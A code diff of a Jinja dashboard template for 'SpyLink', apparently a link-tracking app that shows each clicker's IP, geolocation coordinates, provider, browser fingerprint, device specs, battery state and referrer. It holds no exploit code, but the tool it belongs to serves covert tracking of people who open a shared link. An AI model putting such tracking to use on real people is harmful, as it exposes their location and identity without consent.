@@ -1,297 +1,144 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>SpyLink Dashboard — {{ code }}</title>
-  <link rel="stylesheet" href="/static/style.css">
-  <style>
-    body {
-      background: #0f0f0f;
-      color: #e0e0e0;
-      font-family: "Segoe UI", Roboto, sans-serif;
-    }
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 1rem 2rem;
-      background: #1a1a1a;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.5);
-    }
-    .header .logo {
-      font-size: 1.5rem;
-      font-weight: bold;
-      letter-spacing: 2px;
-    }
-    .header nav a {
-      padding: 0.5rem 1rem;
-      background: #279efc;
-      color: #fff;
-      border-radius: 4px;
-      text-decoration: none;
-      font-size: 0.9rem;
-    }
-    .header nav a:hover {
-      background: #1e7cd9;
-    }
-    main.dashboard {
-      max-width: 800px;
-      margin: 2rem auto;
-      padding: 0 1rem;
-    }
-    .overview {
-      text-align: center;
-      margin-bottom: 2rem;
-    }
-    .overview h1 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-    }
-    .stats {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1rem;
-      justify-content: center;
-    }
-    .stat-card {
-      flex: 1 1 150px;
-      background: #1e1e1e;
-      padding: 1rem;
-      border-radius: 6px;
-      text-align: center;
-      box-shadow: inset 0 0 8px rgba(0,0,0,0.4);
-    }
-    .stat-value {
-      font-size: 2rem;
-      font-weight: bold;
-      margin-bottom: 0.25rem;
-    }
-    .stat-label {
-      font-size: 0.85rem;
-      color: #bbb;
-    }
-    .visit-selector {
-      margin: 1rem 0;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-    .visit-selector select,
-    .visit-selector input,
-    .visit-selector button {
-      padding: 0.5rem;
-      font-size: 0.9rem;
-    }
-    .visits {
-      position: relative;
-    }
-    /* always hide all cards by default */
-    .visit-card {
-      display: none !important;
-      background: #141414;
-      padding: 1rem;
-      border-radius: 6px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.5);
-      display: grid;
-      grid-template-columns: max-content 1fr;
-      column-gap: 1rem;
-      row-gap: 0.5rem;
-    }
-    /* show only the one with “active” */
-    .visit-card.active {
-      display: grid !important;
-    }
-    .visit-card .label {
-      font-size: 0.8rem;
-      color: #888;
-      white-space: nowrap;
-    }
-    .visit-card .value {
-      font-size: 0.9rem;
-      word-break: break-all;
-    }
-    .no-data {
-      text-align: center;
-      padding: 3rem 0;
-      color: #888;
-      font-size: 1rem;
-    }
-    footer.footer {
-      text-align: center;
-      padding: 1rem;
-      font-size: 0.8rem;
-      color: #555;
-    }
-    footer.footer a {
-      color: #279efc;
-      text-decoration: none;
-    }
-    /* Audio controls */
-    #audio-controls {
-      position: fixed;
-      bottom: 1rem;
-      left: 1rem;
-      display: flex;
-      gap: 0.5rem;
-      align-items: center;
-      z-index: 1000;
-    }
-    #mute-btn, #volume-slider {
-      margin: 0;
-    }
-  </style>
-</head>
-<body>
-  <header class="header">
-    <div class="logo">SPYLINK</div>
-    <nav><a href="/">＋ New Link</a></nav>
-  </header>
+{% extends "base.html" %}
 
-  <main class="dashboard">
-    <section class="overview">
-      <h1>Tracking Dashboard</h1>
-      <div class="stats">
-        <div class="stat-card">
-          <div class="stat-value">{{ visits|length }}</div>
-          <div class="stat-label">Total Clicks</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-value">
-            {% if visits %}
-              {{ visits[0][-1] or '—' }}
-            {% else %}
-              —
-            {% endif %}
-          </div>
-          <div class="stat-label">Last Click (UTC)</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-value">{{ code }}</div>
-          <div class="stat-label">Link Code</div>
-        </div>
+{% block title %}Tracking — {{ code }}{% endblock %}
+
+{% block body_attrs %}data-track-code="{{ code }}"{% endblock %}
+
+{% block main_class %}app-main--wide{% endblock %}
+
+{% block nav %}
+<a href="/" class="btn btn--primary btn--sm">+ New link</a>
+{% endblock %}
+
+{% block content %}
+<div class="page-header">
+  <h1 class="page-title">Tracking dashboard</h1>
+  <p class="page-subtitle">Live visitor intelligence for link <code style="color: var(--accent-color);">{{ code }}</code></p>
+</div>
+
+<section aria-labelledby="stats-heading">
+  <h2 id="stats-heading" class="section-title">Overview</h2>
+  <div class="dashboard-grid">
+    <div class="stat-card stat-card--accent">
+      <div class="stat-value">{{ visits|length }}</div>
+      <div class="stat-label">Total clicks</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" style="font-size: 1rem;">
+        {% if visits %}
+          {{ visits[0][-1] or '—' }}
+        {% else %}
+          —
+        {% endif %}
       </div>
-    </section>
+      <div class="stat-label">Last click (UTC)</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" style="font-size: 1.125rem;">{{ code }}</div>
+      <div class="stat-label">Link code</div>
+    </div>
+  </div>
+</section>
 
-    <section class="visits">
-      {% if visits %}
-        <div class="visit-selector">
-          <label for="visitSelect">Select Visitor:</label>
-          <select id="visitSelect">
-            {% for row in visits %}
-              <option value="{{ loop.index0 }}">{{ loop.index }}</option>
-            {% endfor %}
-          </select>
-          <input type="text" id="visitNameInput" placeholder="Enter display name">
-          <button id="setVisitNameBtn">Set Name</button>
-        </div>
+<section style="margin-top: var(--space-10);" aria-labelledby="visits-heading">
+  <h2 id="visits-heading" class="section-title">Visitor details</h2>
 
-        {% set labels = [
-          'IP','Host','Provider','Proxy','Continent','Country','Region','City','Lat/Long',
-          'Browser','OS','User-Agent','Language','Platform','Cookies Enabled',
-          'Screen Width','Screen Height','Viewport Width','Viewport Height','Color Depth',
-          'Device Memory (GB)','CPU Cores','Connection Type','Battery Charging',
-          'Battery Level','Time Zone Offset (min)','Local Time (JS)','Referrer','Timestamp (UTC)'
-        ] %}
+  {% if visits %}
+  {% set labels = [
+    'IP Address','Host','Provider','Proxy','Continent','Country','Region','City','Lat/Long',
+    'Browser','OS','User-Agent','Language','Platform','Cookies Enabled',
+    'Screen Width','Screen Height','Viewport Width','Viewport Height','Color Depth',
+    'Device Memory (GB)','CPU Cores','Connection Type','Battery Charging',
+    'Battery Level','Time Zone Offset (min)','Local Time (JS)','Referrer','Timestamp (UTC)'
+  ] %}
 
-        {% for row in visits %}
-          <div class="visit-card" data-index="{{ loop.index0 }}">
-            {% for idx in range(labels|length) %}
-              <div class="label">{{ labels[idx] }}</div>
-              <div class="value">{{ row[idx] or '—' }}</div>
-            {% endfor %}
-          </div>
-        {% endfor %}
+  {% set sections = [
+    ('Network', '🌐', [0, 1, 2, 3], false),
+    ('Geolocation', '📍', [4, 5, 6, 7, 8], false),
+    ('Browser &amp; Navigator', '🧭', [9, 10, 11, 12, 13, 14], false),
+    ('Display', '🖥️', [15, 16, 17, 18, 19], false),
+    ('Device', '💾', [20, 21], false),
+    ('Connection &amp; Battery', '🔋', [22, 23, 24], false),
+    ('Time &amp; Referrer', '🕐', [25, 26, 27, 28], true)
+  ] %}
 
-      {% else %}
-        <div class="no-data">
-          No visits yet.<br>
-          Share your link and watch this dashboard light up!
-        </div>
-      {% endif %}
-    </section>
-  </main>
+  {% set wide_fields = [11, 27] %}
 
-  <div id="audio-controls">
-    <audio id="bg-audio" src="/static/C418%20-%20Moog%20City%20-%20Minecraft%20Volume%20Alpha%20-%20SMORT.mp3" loop autoplay style="display:none;"></audio>
-    <button id="mute-btn" title="Mute/Unmute">🔊</button>
-    <input type="range" id="volume-slider" min="0" max="1" step="0.01" value="1" title="Volume">
+  <div class="track-toolbar-card toolbar">
+    <label class="toolbar-label" for="visitSelect">Visitor</label>
+    <select class="form-select" id="visitSelect" style="max-width: 220px;">
+      {% for row in visits %}
+      <option value="{{ loop.index0 }}">Visitor {{ loop.index }}</option>
+      {% endfor %}
+    </select>
+    <input class="form-input" type="text" id="visitNameInput" placeholder="Custom label" style="max-width: 200px;" aria-label="Custom visitor name">
+    <button type="button" class="btn btn--secondary btn--sm" id="setVisitNameBtn">Set label</button>
   </div>
 
-  <footer class="footer">
-    &copy; 2025 <a href="/">SpyLink</a> • Built with FastAPI
-  </footer>
+  {% for row in visits %}
+  <div class="visit-detail-panel" data-index="{{ loop.index0 }}">
+    <div class="info-grid">
+      {% for section in sections %}
+      <article class="info-section-card{% if loop.index == 1 %} info-section-card--accent{% endif %}">
+        <header class="info-section-header">
+          <span class="info-section-icon" aria-hidden="true">{{ section[1] }}</span>
+          <h3 class="info-section-title">{{ section[0] }}</h3>
+        </header>
+        <div class="info-fields-grid">
+          {% for idx in section[2] %}
+          {% set val = row[idx] %}
+          {% set display = val if val is not none and val != '' else '—' %}
+          <div class="info-field{% if idx in wide_fields %} info-field--wide{% endif %}">
+            <span class="info-field-label">{{ labels[idx] }}</span>
+            <span class="info-field-value{% if display == '—' %} is-empty{% endif %}">{{ display }}</span>
+          </div>
+          {% endfor %}
+        </div>
+      </article>
+      {% endfor %}
+    </div>
+  </div>
+  {% endfor %}
 
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const select = document.getElementById('visitSelect');
-      const cards = document.querySelectorAll('.visit-card');
-      const nameInput = document.getElementById('visitNameInput');
-      const setNameBtn = document.getElementById('setVisitNameBtn');
-      const names = {};
+  <div style="margin-top: var(--space-10);">
+    <h3 class="section-title">All visits</h3>
+    <div class="table-wrap">
+      <table class="data-table">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>IP</th>
+            <th>Country</th>
+            <th>City</th>
+            <th>Browser</th>
+            <th>OS</th>
+            <th>Timestamp</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for row in visits %}
+          <tr>
+            <td>{{ loop.index }}</td>
+            <td>{{ row[0] or '—' }}</td>
+            <td>{{ row[5] or '—' }}</td>
+            <td>{{ row[7] or '—' }}</td>
+            <td>{{ row[9] or '—' }}</td>
+            <td>{{ row[10] or '—' }}</td>
+            <td>{{ row[-1] or '—' }}</td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+  </div>
 
-      function showCard(idx) {
-        cards.forEach(card => {
-          card.classList.toggle('active', card.dataset.index === idx);
-        });
-      }
-
-      // initial show of newest visit
-      if (cards.length > 0) {
-        select.value = '0';
-        showCard('0');
-      }
-
-      select.addEventListener('change', () => {
-        showCard(select.value);
-        nameInput.value = names[select.value] || '';
-      });
-
-      setNameBtn.addEventListener('click', () => {
-        const idx = select.value;
-        const custom = nameInput.value.trim();
-        if (custom) {
-          names[idx] = custom;
-          select.options[idx].text = custom;
-        }
-      });
-
-      // audio controls
-      const audio = document.getElementById('bg-audio');
-      const btn = document.getElementById('mute-btn');
-      const slider = document.getElementById('volume-slider');
-      audio.volume = slider.value;
-      btn.textContent = audio.muted ? '🔇' : '🔊';
-      document.body.addEventListener('click', () => audio.play().catch(() => {}), { once: true });
-      btn.addEventListener('click', () => {
-        audio.muted = !audio.muted;
-        btn.textContent = audio.muted ? '🔇' : '🔊';
-        if (!audio.muted) audio.play().catch(() => {});
-      });
-      slider.addEventListener('input', e => {
-        audio.volume = e.target.value;
-        if (audio.muted && audio.volume > 0) {
-          audio.muted = false;
-          btn.textContent = '🔊';
-          audio.play().catch(() => {});
-        }
-      });
-
-      // Poll for new visits every 5s
-      const code = "{{ code }}";
-      setInterval(async () => {
-        try {
-          const res = await fetch(`/api/visit-metadata/${code}`);
-          if (!res.ok) return;
-          const { count } = await res.json();
-          if (count > cards.length) {
-            window.location.reload();
-          }
-        } catch (e) {
-          console.warn("poll error", e);
-        }
-      }, 5000);
-    });
-  </script>
-</body>
-</html>
+  {% else %}
+  <div class="empty-state">
+    <div class="empty-state-icon">📊</div>
+    <h3 class="empty-state-title">No visits yet</h3>
+    <p class="empty-state-text">Share your spy link and visitor data will appear here in real time.</p>
+    <a href="/" class="btn btn--secondary" style="margin-top: var(--space-4);">Create another link</a>
+  </div>
+  {% endif %}
+</section>
+{% endblock %}
